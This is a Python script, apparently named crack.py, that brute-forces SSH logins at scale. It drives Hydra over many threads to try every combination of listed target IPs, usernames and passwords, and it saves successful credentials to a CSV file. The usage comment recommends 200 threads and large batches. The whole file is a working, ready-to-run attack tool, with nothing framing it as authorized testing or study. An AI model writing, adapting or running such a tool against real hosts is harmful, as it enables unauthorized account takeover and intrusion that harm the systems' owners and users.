# Typical Usage:

# python3 crack.py \
#   --ip-file targets.txt \
#   --user-file usernames.txt \
#   --pass-file passwords.txt \
#   --output-file successful_logins.csv \
#   --log-file bruteforce.log \
#   --max-threads 200 \
#   --batch-size 10000 \
#   --timeout 30 \
#   --rate-limit 0.5

import argparse
import csv
import itertools
import logging
import os
import sys
import threading
import time
from queue import Queue
from subprocess import run, CalledProcessError, TimeoutExpired

from tqdm import tqdm
import psutil

# --- CONFIGURATION & CONSTANTS ---

DEFAULT_MAX_THREADS = int(os.environ.get('MAX_THREADS', 10))
DEFAULT_BATCH_SIZE = int(os.environ.get('BATCH_SIZE', 50))
DEFAULT_TIMEOUT = int(os.environ.get('HYDRA_TIMEOUT', 20))
DEFAULT_RATE_LIMIT = float(os.environ.get('RATE_LIMIT', 0.2))

# --- LOGGING SETUP ---

def setup_logging(log_file=None, level=logging.INFO):
    handlers = [logging.StreamHandler()]
    if log_file:
        handlers.append(logging.FileHandler(log_file))
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)s %(threadName)s %(message)s",
        handlers=handlers
    )

# --- INPUT VALIDATION ---

def read_list(filename, name):
    try:
        with open(filename, 'r') as f:
            entries = [line.strip() for line in f if line.strip()]
            if not entries:
                logging.error(f"{name} file '{filename}' is empty.")
                sys.exit(1)
            return list(dict.fromkeys(entries))
    except Exception as e:
        logging.error(f"Error reading {name} file '{filename}': {e}")
        sys.exit(1)

def parse_ip_port(ip_entry):
    if ':' in ip_entry:
        ip, port = ip_entry.split(':', 1)
        try:
            port = int(port)
        except ValueError:
            logging.warning(f"Invalid port in entry '{ip_entry}', defaulting to 22.")
            port = 22
        return ip, port
    return ip_entry, 22

def mask_password(pw):
    return pw[:2] + '***' if len(pw) > 2 else '***'

def try_hydra(ip, port, username, password, timeout=DEFAULT_TIMEOUT):
    cmd = [
        'hydra',
        '-l', username,
        '-p', password,
        '-s', str(port),
        f'ssh://{ip}'
    ]
    try:
        result = run(cmd, capture_output=True, text=True, timeout=timeout)
        output = result.stdout + result.stderr
        if "login:" in output or ("host:" in output and "success" in output.lower()):
            return True, output
        return False, output
    except TimeoutExpired:
        logging.warning(f"Timeout for {ip}:{port} {username}:{mask_password(password)}")
        return False, "Timeout"
    except CalledProcessError as e:
        logging.error(f"Hydra error: {e}")
        return False, str(e)
    except Exception as e:
        logging.exception(f"Unexpected error for {ip}:{port} {username}:{mask_password(password)}: {e}")
        return False, str(e)

def attempt_worker(task_queue, result_queue, status, lock, timeout, rate_limit):
    while True:
        item = task_queue.get()
        if item is None:
            break
        ip, port, username, password = item
        success, output = try_hydra(ip, port, username, password, timeout)
        with lock:
            status['attempted'] += 1
            if success:
                status['success'] += 1
                result_queue.put((ip, port, username, password))
                tqdm.write(f"[SUCCESS] {ip}:{port} {username}:{mask_password(password)}")
            else:
                status['fail'] += 1
        time.sleep(rate_limit)
        task_queue.task_done()

def task_generator(ip_port_list, usernames, passwords):
    for (ip, port), username, password in itertools.product(ip_port_list, usernames, passwords):
        yield (ip, port, username, password)

def process_all(ip_file, user_file, pass_file, output_file, log_file, max_threads, batch_size, timeout, rate_limit):
    setup_logging(log_file)
    logging.info("Starting SSH brute force script with memory management and visual status")

    ips_raw = read_list(ip_file, "IP")
    usernames = read_list(user_file, "Username")
    passwords = read_list(pass_file, "Password")

    ip_port_list = [parse_ip_port(ip_entry) for ip_entry in ips_raw]
    total = len(ip_port_list) * len(usernames) * len(passwords)
    logging.info(f"Total combinations to try: {total}")

    result_queue = Queue()
    status = {'attempted': 0, 'success': 0, 'fail': 0}
    lock = threading.Lock()

    # Create a task queue and fill it in batches to avoid memory spikes
    task_queue = Queue(maxsize=batch_size * max_threads)

    # Start worker threads
    workers = []
    for _ in range(max_threads):
        t = threading.Thread(target=attempt_worker, args=(task_queue, result_queue, status, lock, timeout, rate_limit))
        t.daemon = True
        t.start()
        workers.append(t)

    # Progress bar and memory monitor
    with tqdm(total=total, desc="Progress", unit="attempts") as pbar:
        tasks = task_generator(ip_port_list, usernames, passwords)
        submitted = 0
        while submitted < total:
            # Fill the queue with the next batch
            batch_count = 0
            while batch_count < batch_size and submitted < total:
                try:
                    task = next(tasks)
                except StopIteration:
                    break
                task_queue.put(task)
                batch_count += 1
                submitted += 1

            # Visual logging: update progress and memory usage
            while not task_queue.empty():
                with lock:
                    pbar.update(status['attempted'] - pbar.n)
                    pbar.set_postfix(success=status['success'], fail=status['fail'],
                                     mem=f"{psutil.Process(os.getpid()).memory_info().rss // (1024*1024)}MB")
                time.sleep(0.2)

        # Wait for all tasks to finish
        task_queue.join()

        # Final update
        with lock:
            pbar.update(status['attempted'] - pbar.n)
            pbar.set_postfix(success=status['success'], fail=status['fail'],
                             mem=f"{psutil.Process(os.getpid()).memory_info().rss // (1024*1024)}MB")

    # Stop workers
    for _ in workers:
        task_queue.put(None)
    for t in workers:
        t.join()

    # Write results
    with open(output_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['ip', 'port', 'username', 'password'])
        while not result_queue.empty():
            writer.writerow(result_queue.get())

    logging.info(f"Completed. Results written to {output_file}")
    print(f"Total Attempts: {status['attempted']}, Successes: {status['success']}, Failures: {status['fail']}")

def parse_args():
    parser = argparse.ArgumentParser(description="SSH brute force tester with memory management and visual CLI status.")
    parser.add_argument('--ip-file', required=True, help="File with IP:port entries (one per line)")
    parser.add_argument('--user-file', required=True, help="File with usernames (one per line)")
    parser.add_argument('--pass-file', required=True, help="File with passwords (one per line)")
    parser.add_argument('--output-file', default='successful_logins.csv', help="CSV file for successful logins")
    parser.add_argument('--log-file', default=None, help="Log file (optional)")
    parser.add_argument('--max-threads', type=int, default=DEFAULT_MAX_THREADS, help="Max concurrent threads")
    parser.add_argument('--batch-size', type=int, default=DEFAULT_BATCH_SIZE, help="Number of attempts per batch")
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, help="Hydra timeout per attempt (seconds)")
    parser.add_argument('--rate-limit', type=float, default=DEFAULT_RATE_LIMIT, help="Seconds to wait between attempts")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    process_all(
        ip_file=args.ip_file,
        user_file=args.user_file,
        pass_file=args.pass_file,
        output_file=args.output_file,
        log_file=args.log_file,
        max_threads=args.max_threads,
        batch_size=args.batch_size,
        timeout=args.timeout,
        rate_limit=args.rate_limit
    )
